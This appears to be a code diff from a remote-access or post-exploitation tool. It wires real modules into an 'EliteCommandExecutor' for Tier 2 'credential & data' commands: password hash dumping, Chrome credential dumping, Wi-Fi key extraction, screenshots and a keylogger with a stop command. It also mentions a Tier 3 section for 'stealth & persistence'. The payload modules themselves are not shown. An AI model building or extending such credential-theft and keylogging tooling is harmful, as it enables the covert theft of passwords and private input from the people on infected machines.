@@ -142,17 +142,26 @@ class EliteCommandExecutor:
     
     def _load_tier2_commands(self):
         """Load Tier 2 elite commands (credential & data)"""
-        tier2_commands = {
-            'hashdump': 'elite_hashdump',
-            'chromedump': 'elite_chromedump',
-            'wifikeys': 'elite_wifikeys',
-            'screenshot': 'elite_screenshot',
-            'keylogger': 'elite_keylogger'
-        }
         
-        for cmd_name, module_name in tier2_commands.items():
-            # Will be implemented - for now use placeholders
-            self.commands[cmd_name] = self._placeholder_command(cmd_name)
+        # Load implemented Tier 2 commands
+        tier2_commands = [
+            ('hashdump', 'elite_hashdump', 'elite_hashdump'),
+            ('chromedump', 'elite_chromedump', 'elite_chromedump'),
+            ('wifikeys', 'elite_wifikeys', 'elite_wifikeys'),
+            ('screenshot', 'elite_screenshot', 'elite_screenshot'),
+            ('keylogger', 'elite_keylogger', 'elite_keylogger'),
+            ('stopkeylogger', 'elite_keylogger', 'elite_stopkeylogger')
+        ]
+        
+        for cmd_name, module_name, func_name in tier2_commands:
+            try:
+                module = __import__(module_name)
+                func = getattr(module, func_name)
+                self.commands[cmd_name] = func
+                print(f"✅ Loaded {cmd_name} command")
+            except Exception as e:
+                self.commands[cmd_name] = self._placeholder_command(cmd_name)
+                print(f"⚠️ Failed to load {cmd_name}: {e}")
     
     def _load_tier3_commands(self):
         """Load Tier 3 elite commands (stealth & persistence)"""
